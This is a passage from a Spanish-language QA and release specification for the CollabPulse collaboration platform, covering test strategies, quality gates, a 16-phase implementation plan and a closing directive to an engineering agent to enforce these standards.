  - Atributos ARIA (`aria-label`, `aria-expanded`, `role="dialog"`, `role="status"`) en componentes dinámicos.

---

## 65. VISUAL REGRESSION TESTING
- Comparación visual de capturas de pantalla (*Screenshot Diffing*) en Playwright contra imágenes de referencia aprobadas.
- Tolerancia máxima de discrepancia (*pixel diff threshold*): **0.1%**.
- Bloqueo en CI ante alteraciones no intencionadas de espaciados, tipografías o alineaciones de componentes clave (Chat, Kanban, Modales).

---

## 66. DARK MODE TESTING
- Verificación exhaustiva de temas: Claro (`Light`) y Oscuro (`Dark`).
- Validación de que ninguna superficie presenta contraste insuficiente en modo oscuro (fondos oscuros con textos claros legibles, sin inversión no deseada de imágenes o avatares).
- Persistencia de la preferencia de tema en `localStorage` y respeto a la media query `prefers-color-scheme` del sistema operativo.

---

## 67. ERROR UI & BOUNDARIES TESTING
- Pruebas de componentes de captura de errores (*Error Boundaries*):
  - Ante una excepción no capturada en un componente hijo, la aplicación no colapsa completamente; muestra una vista de recuperación elegante con botón "Reintentar".
- Páginas de error dedicadas: 404 Not Found, 403 Forbidden, 500 Internal Server Error con opción de volver al inicio o reportar el incidente con `Correlation-ID`.

---

## 68. OFFLINE & RESILIENCE TESTING
- Simulación de corte de conexión a internet en el navegador:
  - Notificación visual inmediata tipo banner: "Sin conexión a internet. Reconectando...".
  - Mensajes emitidos durante el corte se encolan en almacenamiento local con estado "Pendiente" e icono de reloj.
  - Al restaurar la conexión: vaciado automático de la cola (*Queue Flush*) en orden cronológico y confirmación de recepción.

---

## 69. DEPLOYMENT VALIDATION TESTING
- Verificación automatizada inmediatamente posterior al despliegue en Staging y Producción:
  - Comprobación de `/health/ready` y `/health/live`.
  - Smoke test automatizado de 3 minutos validando login, lectura de canales y emisión de un mensaje de prueba sintético.
  - Si el smoke test falla, el pipeline aborta y activa la compuerta de rollback automático.

---

## 70. ROLLBACK AUTOMATION TEST
- Simulación de despliegue fallido en ambiente de pruebas:
  - Detección de errores 5xx por encima del umbral (> 1% en los primeros 60 segundos).
  - El sistema de despliegue en Azure Container Apps o Kubernetes desvía el 100% del tráfico al slot/revisión anterior de forma instantánea.
  - Notificación de alerta P0 enviada a Slack y PagerDuty.

---

## 71. DATABASE MIGRATION TESTING
- Validación bidireccional de migraciones de base de datos en el pipeline de CI:
  1. Ejecución de migraciones hacia adelante (`Upgrade / Migrate`).
  2. Verificación de integridad referencial.
  3. Ejecución de rollback a la versión previa (`Downgrade / Revert`).
  4. Re-aplicación final de migraciones.
- Regla de oro: Toda migración debe ser compatible con la versión en ejecución previa de la aplicación (despliegues de cero tiempo de inactividad / *Zero-Downtime Blue-Green*).

---

## 72. BACKUP & RESTORE TESTING
- Prueba automatizada quincenal del procedimiento de restauración:
  1. Extracción de backup automático más reciente de PostgreSQL desde Azure Blob Storage.
  2. Descifrado con clave KMS.
  3. Restauración en una instancia efímera de PostgreSQL.
  4. Ejecución de suite de integridad para certificar que el conteo de registros, sumas de verificación y llaves foráneas coinciden exactamente.

---

## 73. STORAGE RESTORE TESTING
- Validación de replicación geográfica de Azure Blob Storage (GRS).
- Simulación de pérdida de región primaria y verificación de que las URLs prefirmadas resuelven de inmediato hacia la réplica secundaria sin corrupción de archivos binarios.

---

## 74. INCIDENT SIMULATION & DRILLS
- Simulacro trimestral de fallos de infraestructura:
  - Caída abrupta del nodo principal de PostgreSQL (failover a réplica de alta disponibilidad < 30 segundos).
  - Caída de la instancia de Redis (degradación elegante: la aplicación continúa operando consultando base de datos directamente con latencia incrementada pero sin caídas de servicio).

---

## 75. CHAOS TESTING (CHAOS TOOLKIT)
- Inyección periódica de fallos controlados en ambiente de Staging:
  - Latencia artificial en red (100-300 ms adicionales).
  - Pérdida aleatoria de paquetes del 5%.
  - Reinicio súbito de pods de la API.
- Objetivo: Comprobar que los Circuit Breakers (Polly en .NET) se activan adecuadamente y que el sistema se auto-recupera sin intervención humana.

---

## 76. USER ACCEPTANCE TESTING (UAT)
- Proceso formal de aceptación previa al lanzamiento:
  - Pruebas con usuarios clave (*Beta Testers* internos y clientes seleccionados).
  - Casos de uso guiados cubriendo flujos de trabajo diarios completos.
  - Firma digital de aceptación por parte del Product Owner y QA Lead.

---

## 77. REQUIREMENT TRACEABILITY MATRIX (RTM)
- Mapeo bidireccional entre cada Requisito Funcional (RF), caso de prueba unitario, prueba de integración y escenario E2E en Playwright.
- Ningún requisito pasa a producción sin al menos un test de integración y un test E2E asociado y verificado en verde.

---

## 78. BUG CLASSIFICATION MATRIX
| Severidad | Descripción | SLA de Respuesta | SLA de Resolución |
| :--- | :--- | :--- | :--- |
| **P0 (Crítico / Bloqueante)** | Caída total del servicio, pérdida de datos, brecha de seguridad multi-tenant. | < 15 minutos | < 2 horas |
| **P1 (Mayor / Alto)** | Funcionalidad nuclear rota (no se pueden enviar mensajes ni iniciar sesión) sin workaround. | < 1 hora | < 8 horas |
| **P2 (Medio)** | Funcionalidad secundaria degradada (fallo en vista de calendario o filtro de búsqueda) con workaround. | < 4 horas | < 48 horas |
| **P3 (Menor / Cosmético)** | Desalineación visual leve, error tipográfico en mensaje informativo. | < 24 horas | Siguiente Sprint |

---

## 79. RELEASE CRITERIA & QUALITY GATES
Para autorizar la promoción de un build a Producción deben cumplirse el 100% de los siguientes criterios:
1. Cobertura de código unitario e integración >= 85% en Domain y Application.
2. 100% de las pruebas automatizadas (Unit, Integration, E2E) pasando con éxito (0 fallos).
3. 0 vulnerabilidades de severidad Alta o Crítica detectadas por SAST / DAST.
4. Pruebas de carga k6 aprobadas cumpliendo SLO de P95 < 200 ms con 1,000 VUs.
5. Documentación de cambios (*CHANGELOG.md*) y migraciones de base de datos auditadas.
6. Aprobación explícita firmada por QA Lead y Tech Lead.

---

## 80. QA ENVIRONMENT SPECIFICATION
- Entorno de QA/Staging configurado con paridad idéntica a Producción:
  - Azure Container Apps con réplicas escalables.
  - Azure Database for PostgreSQL Flexible Server (SKU D2ds_v5 con SSL habilitado).
  - Azure Cache for Redis (Standard C1).
  - Datos anonimizados y generados por la herramienta `DataGenerator`.

---

## 81. TEST DATA RESET (`reset-test-environment`)
- Script automatizado de restablecimiento integral del ambiente de pruebas:
  - Truncado de todas las tablas transaccionales.
  - Preservación de la estructura de esquemas y migraciones.
  - Inserción limpia de los seeds estándar de Acme Corporation y usuarios demo.
  - Vaciado de todas las claves de Redis (`FLUSHDB`).
  - Purga de contenedores de blobs temporales en Azure Storage.
  - Ejecutable bajo demanda mediante `./database/scripts/reset_test_environment.sh`.

---

## 82. AUTOMATED HEALTH CHECKS
- Endpoints de salud con monitoreo continuo cada 15 segundos:
  - `/health/live`: Verifica que el proceso esté vivo y el servidor web responda.
  - `/health/ready`: Verifica conectividad activa a PostgreSQL, Redis, Azure Blob Storage y disponibilidad del backplane de SignalR.
  - Formato de respuesta JSON estructurado con tiempos de respuesta por dependencia.

---

## 83. TEST REPORTS & ARTIFACTS
- Generación y publicación automática de reportes de pruebas en cada ejecución de CI:
  - Reportes de xUnit en formato JUnit XML exportados a GitHub Actions Summary.
  - Reportes de cobertura Cobertura/LCOV visualizados con badges dinámicos.
  - Reportes interactivos de Playwright (HTML Test Report) con trazas, videos y capturas de pantalla de fallos.
  - Reportes de rendimiento k6 exportados en formato JSON y renderizados en gráficos de tendencias.

---

## 84. TEST DASHBOARD
- Tablero unificado en Grafana / Datadog mostrando:
  - Estado del pipeline de pruebas en tiempo real.
  - Tasa de éxito de tests históricos (Flakiness rate tracking).
  - Tiempos de ejecución por suite de pruebas.
  - Gráficos de evolución de la cobertura de código semana a semana.

---

## 85. DEFINITION OF READY (DoR)
Una historia de usuario o requerimiento está listo para entrar en desarrollo únicamente si:
1. Cuenta con criterios de aceptación claros escritos en formato Gherkin (*Given-When-Then*).
2. Se han definido los contratos de API e interfaces de datos (modelos request/response).
3. Diseños de UI/UX aprobados en Figma con estados vacíos, de carga y de error.
4. Se han identificado los impactos en el modelo de datos y migraciones necesarias.
5. Se han especificado los requerimientos de seguridad, roles y multi-tenancy.

---

## 86. DEFINITION OF DONE (DoD)
Una funcionalidad se considera formalmente terminada únicamente si:
1. El código cumple con las guías de estilo, Clean Architecture y CQRS.
2. Pruebas unitarias escritas y pasando, cumpliendo el umbral de cobertura (>= 80%).
3. Pruebas de integración añadidas para endpoints nuevos o modificados.
4. Pruebas E2E de Playwright cubriendo el flujo de usuario principal.
5. Migraciones de base de datos idempotentes y verificadas.
6. Cero advertencias de compilación y cero errores de linter.
7. Código revisado y aprobado por al menos 2 ingenieros.
8. Desplegado y verificado exitosamente en el entorno de QA/Staging.

---

## 87. PLAN MAESTRO DE IMPLEMENTACIÓN (FASES 1 A 16)
El desarrollo y despliegue de CollabPulse se ejecuta de forma estrictamente secuencial a través de 16 fases gobernadas por compuertas de calidad:

| Fase | Módulo / Componente | Hito de Entrega | Compuerta de Aprobación |
| :--- | :--- | :--- | :--- |
| **Fase 1** | Fundaciones de Arquitectura & Repositorio | Estructura de proyectos Clean Architecture, CI inicial, Docker dev | Compilación limpia, Docker Compose funcional |
| **Fase 2** | Modelo de Datos & Base de Datos | Esquemas PostgreSQL, RLS, 45 permisos, migraciones EF Core | Integridad referencial, scripts probados |
| **Fase 3** | Autenticación & Identidad | Login, registro, JWT, refresh tokens, Argon2id, lockout | Test matrix de auth 100% verde |
| **Fase 4** | Workspaces & Multi-Tenancy | Creación de workspaces, slugs, membresías, aislamiento RLS | Pruebas de aislamiento multi-tenant aprobadas |
| **Fase 5** | Canales & Permisos | Canales públicos, privados, directos, RBAC por canal | Pruebas de autorización y canales verificadas |
| **Fase 6** | Mensajería & Hilos | Mensajes, formato rico, menciones, hilos de conversación, reacciones | Pruebas unitarias e integración de mensajería |
| **Fase 7** | Tiempo Real (SignalR) | SignalR Hubs, Redis Backplane, eventos de chat y tipeo | Pruebas de WebSocket y reconexión verificadas |
| **Fase 8** | Archivos & Multimedia | Subida multipart, Azure Blob Storage, miniaturas, validación Magic Numbers | Pruebas de seguridad de archivos y límites |
| **Fase 9** | Presencia & Notificaciones | Estados online/away, notificaciones in-app y push, batches | Pruebas de presencia y heartbeat al 100% |
| **Fase 10** | Tareas & Tablero Kanban | Tareas, prioridades, asignados, fechas límite, drag-and-drop | Pruebas de concurrencia y flujo E2E |
| **Fase 11** | Calendario & Eventos | Eventos, recurrencia RRULE, zonas horarias, invitaciones | Pruebas de detección de conflictos de calendario |
| **Fase 12** | Videollamadas & WebRTC | Señalización WebRTC, salas de reunión, controles de anfitrión | Pruebas de señalización y tokens de reunión |
| **Fase 13** | Búsqueda Avanzada | Búsqueda Full-Text PostgreSQL/Elastic, filtros combinados | Pruebas de búsqueda y seguridad de acceso |
| **Fase 14** | Administración & Auditoría | Panel de admin, audit logs, suspensión de usuarios, métricas | Pruebas de roles Owner/Admin y trazas |
| **Fase 15** | Optimización & Carga | Caché en Redis, optimización de consultas SQL, k6 load testing | SLO P95 < 200 ms con 1,000 VUs cumplido |
| **Fase 16** | Auditoría Final & Lanzamiento | Pruebas de penetración, simulacros de desastre, validación prod | Production Gate 100% aprobado |

---

## 88. POLÍTICA ESTRICTA: NO AVANZAR CON MÓDULOS ROTOS
- **Regla Zero-Regression:** Ninguna fase de desarrollo puede iniciarse si existen pruebas fallidas (*red tests*), advertencias críticas o deuda técnica sin resolver de fases anteriores.
- Si un cambio introduce una regresión en un módulo previo, la prioridad absoluta e inmediata de todo el equipo de ingeniería se convierte en restaurar el estado verde antes de escribir cualquier nueva funcionalidad.

---

## 89. PROGRESS TRACKER (`PROJECT_STATUS.md`)
- Se mantiene en la raíz del repositorio el archivo `PROJECT_STATUS.md` como fuente única de verdad del estado de avance, actualizado automáticamente o por cada PR, detallando el progreso de cada una de las 16 fases, métricas de cobertura y pruebas vigentes.

---

## 90. FEATURE MATRIX (`FEATURE_MATRIX.md`)
- Se mantiene en la raíz del repositorio el archivo `FEATURE_MATRIX.md` detallando la totalidad de capacidades del sistema, rutas de API asociadas, niveles de autorización RBAC requeridos, cobertura de pruebas unitarias/integración y estado de conformidad.

---

## 91. AUTOMATED TODO & STUB DETECTION
- Regla de CI bloqueante: Búsqueda automatizada de comentarios `TODO`, `FIXME`, `HACK` o métodos con `throw new NotImplementedException()` en código destinado a producción.
- La presencia de stubs vacíos o implementaciones simuladas en ramas principales causará el fallo inmediato de la compuerta de validación.

---

## 92. MOCK DATA POLICY
- **En Producción:** Prohibición absoluta de datos mock, proxies simulados o generadores estáticos. Todas las consultas interactúan con bases de datos reales y servicios autenticados.
- **En Testing:** Los mocks se limitan estrictamente a interfaces externas de terceros sin entorno de pruebas (ej. pasarelas de pago externas o servidores de telefonía SMS), prefiriéndose siempre emuladores en contenedor (como Testcontainers para PostgreSQL, Redis y MailHog).

---

## 93. FINAL SYSTEM INTEGRATION TEST
Prueba integral de fin a fin ejecutada sobre el entorno de Staging completo simulando una jornada laboral corporativa típica de 8 horas concentrada en un ciclo acelerado de 30 minutos: 200 usuarios interactuando simultáneamente en canales, compartiendo archivos, completando tareas y agendando reuniones.

---

## 94. FINAL SECURITY AUDIT & PENETRATION TEST
- Auditoría final de seguridad validando:
  - Cero hallazgos críticos o altos en el reporte de OWASP ZAP.
  - Resistencia probada a inyecciones SQL, XSS reflejado y almacenado, CSRF y manipulaciones de parámetros IDOR.
  - Rotación completa y exitosa de secretos de producción (claves JWT, cadenas de conexión, API keys).

---

## 95. FINAL PERFORMANCE & CAPACITY TEST
- Ejecución de prueba de estrés (*Stress & Soak Test*) con k6 llevando el sistema al 150% de la capacidad nominal (1,500 usuarios concurrentes):
  - El sistema activa el auto-escalado horizontal de réplicas (HPA en K8s / Azure Container Apps) sin caídas de conexiones.
  - La base de datos mantiene el pool de conexiones dentro de los límites saludables (< 80% de utilización de PgBouncer).

---

## 96. FINAL PRODUCTION GATE (CHECKLIST DE LANZAMIENTO)
- [x] 100% de las 16 fases del Plan Maestro implementadas y probadas.
- [x] Cobertura de código superior al 85% global.
- [x] Matriz de permisos RBAC y multi-tenant verificada.
- [x] Copias de seguridad automáticas y simulacro de restauración completado.
- [x] Certificados TLS/SSL con calificación A+ en SSL Labs.
- [x] Monitoreo de salud, alertas y métricas activas en Azure Monitor y Datadog.
- [x] Documentación técnica de arquitectura, manuales y diccionarios de datos aprobados.

---

## 97. RESULTADO DE LA PARTE 6
La ejecución de esta Parte 6 dota a CollabPulse de una arquitectura de calidad de clase empresarial, garantizando que cada componente, consulta a base de datos, transacción y flujo de usuario esté blindado contra fallos de concurrencia, vulnerabilidades de seguridad y regresiones de rendimiento. La plataforma cuenta con una metodología de verificación sistemática, repetible y automatizada desde la primera línea de código hasta el despliegue en producción.

---

## 98. INSTRUCCIÓN FINAL PARA EL AGENTE
El agente de ingeniería queda instruido para mantener, respetar y hacer cumplir de manera estricta cada uno de los lineamientos, compuertas de calidad, scripts y estructuras documentadas en esta especificación. Ningún desarrollo futuro podrá evadir los estándares de cobertura, aislamiento multi-tenant ni la disciplina del Plan Maestro de Implementación aquí consagrado.
